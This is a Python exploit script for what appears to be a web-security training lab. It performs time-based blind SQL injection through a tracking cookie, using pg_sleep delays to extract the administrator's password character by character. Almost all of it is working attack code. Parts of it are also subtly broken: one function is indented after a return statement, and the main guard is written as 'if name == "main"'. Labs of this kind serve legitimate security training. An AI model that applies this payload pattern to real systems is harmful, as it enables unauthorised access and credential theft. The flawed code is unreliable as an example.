"""

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


Lab: Blind SQL injection with time delays and information retrieval
"""

import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# Target details
url = "https://0afb005004ba7542800c713900810055.web-security-academy.net/filter?category=Toys+%26+Games"
original_tracking_id = "97sVEngGnhAODmGX"

# Characters to try (lowercase letters and numbers)
chars = string.ascii_lowercase + string.digits

# Threshold for considering a response "delayed" (in seconds)
DELAY_THRESHOLD = 5
# Password length (based on the document)
PASSWORD_LENGTH = 20
# Sleep time for the SQL injection (in seconds)
SQL_SLEEP_TIME = 10

def test_character(position, char):
    """Test if a specific character is at a specific position in the password."""
    # Create the SQL injection payload
    payload = f"{original_tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep({SQL_SLEEP_TIME})+ELSE+pg_sleep(0)+END+FROM+users--"
    
    # Set cookies
    cookies = {
        "TrackingId": payload
    }
    
    start_time = time.time()
    try:
        response = requests.get(url, cookies=cookies, timeout=SQL_SLEEP_TIME + 5)
        response_time = time.time() - start_time
        
        # Check if the response was delayed (indicating correct character)
        if response_time >= DELAY_THRESHOLD:
            return True, char, response_time
        return False, char, response_time
    except requests.exceptions.Timeout:
        # Handle timeout - could be a true condition causing delay
        response_time = time.time() - start_time
        return True, char, response_time
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None, char, 0

def find_password_character(position):
    """Find the character at a specific position in the password."""
    print(f"Testing position {position}...")
    
    # Try each possible character
    for char in chars:
        is_match, tested_char, response_time = test_character(position, char)
        
        # If match found or error occurred
        if is_match:
            print(f"Found character at position {position}: {char} (response time: {response_time:.2f}s)")
            return char
        else:
            print(f"Testing character '{char}' at position {position}: not a match (response time: {response_time:.2f}s)")
    
    return None

def extract_password():
    """Extract the complete password character by character."""
    password = ""
    
    for position in range(1, PASSWORD_LENGTH + 1):
        character = find_password_character(position)
        
        if character:
            password += character
            print(f"Current password: {password}")
        else:
            print(f"Failed to find character at position {position}")
            break
    
    return password
    def verify_password_length():
    """Verify the length of the password (optional)."""
    print("Verifying password length...")
    
    for length in range(1, 30):  # Try lengths from 1 to 30
        # Create the payload to test if password length > current length
        payload = f"{original_tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>{length})+THEN+pg_sleep({SQL_SLEEP_TIME})+ELSE+pg_sleep(0)+END+FROM+users--"
        
        cookies = {
            "TrackingId": payload
        }
        
        start_time = time.time()
        try:
            response = requests.get(url, cookies=cookies, timeout=SQL_SLEEP_TIME + 5)
            response_time = time.time() - start_time
            
            print(f"Testing if password length > {length}: Response time = {response_time:.2f}s")
            
            # If response is quick, we found the password length
            if response_time < DELAY_THRESHOLD:
                return length
                
        except requests.exceptions.Timeout:
            # Timeout likely means the condition is true
            print(f"Testing if password length > {length}: TIMEOUT (likely true)")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
    
    return 20  # Default to 20 if we can't determine

if name == "main":
    print("Starting time-based blind SQL injection password extraction...")
    start_time = time.time()
    
    # Uncomment the next line if you want to verify the password length first
    # password_length = verify_password_length()
    # print(f"Password length determined to be {password_length}")
    
    final_password = extract_password()
    
    elapsed_time = time.time() - start_time
    print(f"\nExtraction completed in {elapsed_time:.2f} seconds")
    print(f"Administrator password: {final_password}")